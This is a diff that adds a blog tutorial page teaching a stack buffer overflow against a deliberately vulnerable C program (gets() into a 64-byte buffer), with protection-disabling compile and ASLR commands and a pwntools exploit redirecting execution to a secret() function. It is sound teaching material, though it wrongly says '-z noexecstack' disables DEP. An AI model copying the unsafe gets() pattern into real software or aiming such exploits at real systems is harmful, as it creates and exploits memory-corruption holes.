@@ -1,0 +1,438 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <title>
+  buffer overflow in practice · pwnbuffer
+</title>
+  <meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="color-scheme" content="light dark">
+
+
+
+
+<meta name="author" content="pwnbuffer">
+<meta name="description" content="Simple Tutorial Header">
+<meta name="keywords" content="team brazuca!">
+
+
+
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="buffer overflow in practice">
+  <meta name="twitter:description" content="Simple Tutorial Header">
+
+<meta property="og:url" content="https://pwnbuffer.github.io/posts/slayer/bof/">
+  <meta property="og:site_name" content="pwnbuffer">
+  <meta property="og:title" content="buffer overflow in practice">
+  <meta property="og:description" content="Simple Tutorial Header">
+  <meta property="og:locale" content="en">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2025-02-07T00:00:00+00:00">
+    <meta property="article:modified_time" content="2025-02-07T00:00:00+00:00">
+    <meta property="article:tag" content="Buffer Overflow">
+    <meta property="article:tag" content="Low Level">
+
+
+
+
+<link rel="canonical" href="https://pwnbuffer.github.io/posts/slayer/bof/">
+
+
+<link rel="preload" href="https://pwnbuffer.github.io/fonts/fa-brands-400.woff2" as="font" type="font/woff2" crossorigin>
+<link rel="preload" href="https://pwnbuffer.github.io/fonts/fa-regular-400.woff2" as="font" type="font/woff2" crossorigin>
+<link rel="preload" href="https://pwnbuffer.github.io/fonts/fa-solid-900.woff2" as="font" type="font/woff2" crossorigin>
+
+
+  
+  
+  <link rel="stylesheet" href="https://pwnbuffer.github.io/css/coder.min.b886fe0d9034709648f91f4ce178f51dd367d9350f82dd1132d54fd69bfca66f.css" integrity="sha256-uIb&#43;DZA0cJZI&#43;R9M4Xj1HdNn2TUPgt0RMtVP1pv8pm8=" crossorigin="anonymous" media="screen" />
+
+
+
+
+
+
+  
+    
+    
+    <link rel="stylesheet" href="https://pwnbuffer.github.io/css/coder-dark.min.165f5fe7c98269a5cfc54f81472e0f84ebc32d92bbe6c9db1f06962b0817bda1.css" integrity="sha256-Fl9f58mCaaXPxU&#43;BRy4PhOvDLZK75snbHwaWKwgXvaE=" crossorigin="anonymous" media="screen" />
+  
+
+
+
+ 
+
+
+
+
+<link rel="icon" type="image/svg+xml" href="https://pwnbuffer.github.io/img/favicon.svg" sizes="any">
+<link rel="icon" type="image/png" href="https://pwnbuffer.github.io/img/favicon-32x32.ico" sizes="32x32">
+<link rel="icon" type="image/png" href="https://pwnbuffer.github.io/img/favicon-16x16.ico" sizes="16x16">
+
+<link rel="apple-touch-icon" href="https://pwnbuffer.github.io/images/apple-touch-icon.png">
+<link rel="apple-touch-icon" sizes="180x180" href="https://pwnbuffer.github.io/images/apple-touch-icon.png">
+
+<link rel="manifest" href="https://pwnbuffer.github.io/site.webmanifest">
+<link rel="mask-icon" href="https://pwnbuffer.github.io/images/safari-pinned-tab.svg" color="#5bbad5">
+
+
+
+
+
+
+
+
+
+</head>
+
+
+
+
+
+
+<body class="preload-transitions colorscheme-dark">
+  
+
+  <main class="wrapper">
+    <nav class="navigation">
+  <section class="container">
+    
+    <a class="navigation-title" href="https://pwnbuffer.github.io/">
+      pwnbuffer
+    </a>
+    
+    
+      <input type="checkbox" id="menu-toggle" />
+      <label class="menu-button float-right" for="menu-toggle">
+        <i class="fa-solid fa-bars fa-fw" aria-hidden="true"></i>
+      </label>
+      <ul class="navigation-list">
+        
+          
+            <li class="navigation-item">
+              <a class="navigation-link " href="https://pwnbuffer.github.io/about/">About</a>
+            </li>
+          
+            <li class="navigation-item">
+              <a class="navigation-link " href="https://pwnbuffer.github.io/posts/">Posts</a>
+            </li>
+          
+            <li class="navigation-item">
+              <a class="navigation-link " href="https://pwnbuffer.github.io/categories/">Categories</a>
+            </li>
+          
+            <li class="navigation-item">
+              <a class="navigation-link " href="https://pwnbuffer.github.io/members/">Members</a>
+            </li>
+          
+        
+        
+          
+          
+          
+            
+          
+            
+              
+                <li class="navigation-item menu-separator">
+                  <span>|</span>
+                </li>
+                
+              
+              <li class="navigation-item">
+                <a href="https://pwnbuffer.github.io/pt-br/">🇧🇷</a>
+              </li>
+            
+          
+        
+      </ul>
+    
+  </section>
+</nav>
+
+
+    <div class="content">
+      
+  <section class="container post">
+    <article>
+      <header>
+        <div class="post-title">
+          <h1 class="title">
+            <a class="title-link" href="https://pwnbuffer.github.io/posts/slayer/bof/">
+              buffer overflow in practice
+            </a>
+          </h1>
+        </div>
+        <div class="post-meta">
+          <div class="date">
+            <span class="posted-on">
+              <i class="fa-solid fa-calendar" aria-hidden="true"></i>
+              <time datetime="2025-02-07T00:00:00Z">
+                February 7, 2025
+              </time>
+            </span>
+            <span class="reading-time">
+              <i class="fa-solid fa-clock" aria-hidden="true"></i>
+              4-minute read
+            </span>
+          </div>
+          <div class="authors">
+  <i class="fa-solid fa-user" aria-hidden="true"></i>
+    <a href="https://pwnbuffer.github.io/authors/slayer/">Slayer</a></div>
+
+          <div class="categories">
+  <i class="fa-solid fa-folder" aria-hidden="true"></i>
+    <a href="https://pwnbuffer.github.io/categories/low-level/">Low-Level</a>
+      <span class="separator">•</span>
+    <a href="https://pwnbuffer.github.io/categories/buffer-overflow/">Buffer-Overflow</a>
+      <span class="separator">•</span>
+    <a href="https://pwnbuffer.github.io/categories/exploit-development/">Exploit-Development</a></div>
+
+          <div class="tags">
+  <i class="fa-solid fa-tag" aria-hidden="true"></i>
+    <span class="tag">
+      <a href="https://pwnbuffer.github.io/tags/buffer-overflow/">Buffer Overflow</a>
+    </span>
+      <span class="separator">•</span>
+    <span class="tag">
+      <a href="https://pwnbuffer.github.io/tags/low-level/">Low Level</a>
+    </span></div>
+
+        </div>
+      </header>
+
+      <div class="post-content">
+        
+        <h1 id="what-is-buffer-overflow">
+  What is buffer overflow?
+  <a class="heading-link" href="#what-is-buffer-overflow">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h1>
+<p><strong>Buffer overflow (BOF) is one of the most wellknown and historically significant vulnerabilities in the world of cybersecurity. It occurs when a program writes more data to a buffer than it can hold, causing memory corruption. This flaw can be exploited by pentesters to execute arbitrary code, modify program behavior, or cause a crash.</strong></p>
+<p><strong>Despite the introduction of modern security mechanisms such as ASLR and stack canaries, buffer overflow remains a critical topic in exploit development and pentesting. Understanding how BOF works, how to detect it, and how to exploit it is essential.</strong></p>
+<p><strong>In this article, we will create a simple C program, which is intentionally vulnerable and an exploit in python.</strong></p>
+<h1 id="hands-on">
+  hands on!
+  <a class="heading-link" href="#hands-on">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h1>
+<p><strong>Lets go! For this simple paper i created a code in C for us to practice:</strong></p>
+
+
+
+
+
+<div class="tabs tabs-code tabs-left">
+  
+
+
+
+
+<style>
+  .tabs input#tab-0-0:checked ~ .tab-content-0-0 {
+    display: block;
+  }
+</style>
+
+<input type="radio" class="tab-input" name="tab-select-0" id="tab-0-0" checked/>
+<label for="tab-0-0" class="tab-label">C</label>
+<div class="tab-content tab-content-0-0">
+  <div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#0f0;font-weight:bold">#include</span> <span style="color:#0f0;font-weight:bold">&lt;stdio.h&gt;</span><span style="color:#0f0;font-weight:bold">
+</span></span></span><span style="display:flex;"><span><span style="color:#0f0;font-weight:bold">#define _GNU_SOURCE
+</span></span></span><span style="display:flex;"><span><span style="color:#0f0;font-weight:bold">#include</span> <span style="color:#0f0;font-weight:bold">&lt;string.h&gt;</span><span style="color:#0f0;font-weight:bold">
+</span></span></span><span style="display:flex;"><span><span style="color:#0f0;font-weight:bold"></span>
+</span></span><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">void</span> secret() {
+</span></span><span style="display:flex;"><span>    printf(<span style="color:#0ff;font-weight:bold">&#34;BOF explorado</span><span style="color:#0ff;font-weight:bold">\n</span><span style="color:#0ff;font-weight:bold">&#34;</span>);
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">void</span> funcvuln() {
+</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">char</span> buffer[<span style="color:#ff0;font-weight:bold">64</span>];
+</span></span><span style="display:flex;"><span>    printf(<span style="color:#0ff;font-weight:bold">&#34;input: &#34;</span>);
+</span></span><span style="display:flex;"><span>    gets(buffer);
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">int</span> main() {
+</span></span><span style="display:flex;"><span>    funcvuln();
+</span></span><span style="display:flex;"><span>    printf(<span style="color:#0ff;font-weight:bold">&#34;.</span><span style="color:#0ff;font-weight:bold">\n</span><span style="color:#0ff;font-weight:bold">&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">return</span> <span style="color:#ff0;font-weight:bold">0</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div>
+</div>
+
+
+
+
+</div>
+
+
+
+<p><strong>This code is vulnerable to BOF due to the use of the <code>gets()</code> function, which does not perform bounds checking on the input provided. The <code>gets()</code> reads input from the user and stores it into the buffer <code>char buffer[64]</code>. However, it doesn&rsquo;t check the size of the input. If the input exceeds the allocated size of 64 bytes, it will overwrite adjacent memory locations, which can lead to unpredictable behavior, including the ability to overwrite the return address of the <code>funcvuln()</code> function. If the user inputs more than 64 characters, the extra characters will overflow the <code>buffer</code> and may overwrite the saved return address in the stack. This could potentially allow an attacker to control the flow of the program by redirecting the execution to the <code>secret()</code> function, which prints <code>BOF explorado</code>!</strong></p>
+<p><strong>To compile code so that it is vulnerable to BOF, we need to ensure that modern compiler protections such as SSP, DEP, and ASLR are disabled: <code>gcc -fno-stack-protector -z noexecstack -std=gnu99 -o bof bof.c</code></strong></p>
+<p><strong>After compiling the binary, we can see that a warning message appears!</strong></p>
+<p><img src="https://pwnbuffer.github.io/images/slayer/bof/error_gcc.png" alt="Error gcc"></p>
+<p><strong>We must also disable ASLR for our current session: <code>echo 0 | sudo tee /proc/sys/kernel/randomize_va_space</code></strong></p>
+<p><strong>Now, lets finally explore BOF!</strong></p>
+<h1 id="exploitation">
+  Exploitation!
+  <a class="heading-link" href="#exploitation">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h1>
+<p><strong>Get to work! Lets use gdb to analyze the binary and better understand how it behaves in memory. This will help us find the correct offset to override the function return: <code>gdb ./bof</code></strong></p>
+<p><strong>The first thing I did when starting gdb was to use <code>info functions</code> to list the functions present in the binary:</strong></p>
+<p><img src="https://pwnbuffer.github.io/images/slayer/bof/info_command.png" alt="Command"></p>
+<p><strong>Now that we have found the function addresses, lets pop the BOF and see if there are any changes:</strong></p>
+<p><img src="https://pwnbuffer.github.io/images/slayer/bof/BOOM.png" alt="Command"></p>
+<p><strong>eee&hellip; BOOM! We overflowed the buffer and received a <code>Segmentation fault.</code>! After that, we list the function again&hellip;</strong></p>
+<p><img src="https://pwnbuffer.github.io/images/slayer/bof/secret.png" alt="Command"></p>
+<p><strong>BOOYHA! The function address that was previously <code>0x0000000000001159</code> has now become <code>0x555555555159</code>! We will use this new address to explore! To do this, we will create an exploit where a payload will be sent that exceeds the buffer size, overwriting the return address of the <code>funcvuln()</code> function:</strong></p>
+
+
+
+
+
+<div class="tabs tabs-code tabs-left">
+  
+
+
+
+
+<style>
+  .tabs input#tab-1-0:checked ~ .tab-content-1-0 {
+    display: block;
+  }
+</style>
+
+<input type="radio" class="tab-input" name="tab-select-1" id="tab-1-0" checked/>
+<label for="tab-1-0" class="tab-label">Python</label>
+<div class="tab-content tab-content-1-0">
+  <div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">from</span> pwn <span style="color:#fff;font-weight:bold">import</span> *
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>address = p64(<span style="color:#ff0;font-weight:bold">0x0000555555555159</span>)
+</span></span><span style="display:flex;"><span>payload = <span style="color:#0ff;font-weight:bold">b</span><span style="color:#0ff;font-weight:bold">&#34;A&#34;</span> * <span style="color:#ff0;font-weight:bold">72</span> + address
+</span></span><span style="display:flex;"><span>p = process(<span style="color:#0ff;font-weight:bold">&#34;./bof&#34;</span>)
+</span></span><span style="display:flex;"><span>p.sendline(payload)
+</span></span><span style="display:flex;"><span>p.interactive()
+</span></span></code></pre></div>
+</div>
+
+
+
+
+</div>
+
+
+
+<p><strong>And theres the exploit. But lets understand how it works! First, it imports the pwntools functions, and sets the address of the <code>secret()</code> function, <code>p64()</code> converts the address to 64 bit format, because on 64 bit systems, memory addresses are 8 bytes.</strong></p>
+<p><strong>After setting and converting the address, we create the payload. <code>b&quot;A&quot; * 72</code> creates a 72 byte string of <code>'A'</code> to fill the stack to the point where the return address of the <code>funcvuln()</code> function is stored, and the <code>+ address</code> adds the address of the <code>secret()</code> function to the end, replacing the return address of <code>funcvuln()</code></strong></p>
+<p><strong>Now that the exploit has been explained, LET&rsquo;S EXPLOIT!</strong></p>
+<p><img src="https://pwnbuffer.github.io/images/slayer/bof/exploited.png" alt="Command"></p>
+<p><strong>And as expected, we managed to explore this BOF! This is a very basic example, just to demonstrate the practical logic of how a buffer overflow attack can happen ;)</strong></p>
+
+      </div>
+
+
+      <footer>
+        
+
+
+        
+        
+        
+        
+        
+        
+        
+      </footer>
+    </article>
+
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.16.4/dist/katex.min.css"
+    integrity="sha384-vKruj+a13U8yHIkAyGgK1J3ArTLzrFGBbBc0tDp4ad/EyewESeXE/Iv67Aj8gKZ0" crossorigin="anonymous">
+  
+  <script defer src="https://cdn.jsdelivr.net/npm/katex@0.16.4/dist/katex.min.js"
+    integrity="sha384-PwRUT/YqbnEjkZO0zZxNqcxACrXe+j766U2amXcgMg5457rve2Y7I6ZJSm2A0mS4" crossorigin="anonymous"></script>
+  <script defer src="https://cdn.jsdelivr.net/npm/katex@0.16.4/dist/contrib/auto-render.min.js"
+    integrity="sha384-+VBxd3r6XgURycqtZ117nYw44OOcIax56Z4dCRWbxyPt0Koah1uHoK0o4+/RRE05" crossorigin="anonymous"
+    onload="renderMathInElement(document.body,
+      {
+        delimiters: [
+          {left: '$$', right: '$$', display:true},
+          {left: '$', right: '$', display:false},
+          {left: '\\(', right: '\\)', display: false},
+          {left: '\\[', right: '\\]', display: true}
+        ]
+      }
+    );"></script>
+  </section>
+
+    </div>
+
+    <footer class="footer">
+  <section class="container">
+    ©
+    
+    2025
+     pwnbuffer 
+    ·
+    
+    Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> & <a href="https://github.com/luizdepra/hugo-coder/" target="_blank" rel="noopener">Coder (modified)</a>.
+    
+  </section>
+</footer>
+
+  </main>
+
+  
+
+  
+  
+  <script src="https://pwnbuffer.github.io/js/coder.min.6ae284be93d2d19dad1f02b0039508d9aab3180a12a06dcc71b0b0ef7825a317.js" integrity="sha256-auKEvpPS0Z2tHwKwA5UI2aqzGAoSoG3McbCw73gloxc="></script>
+  
+
+  
+
+  
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+</body>
+</html>
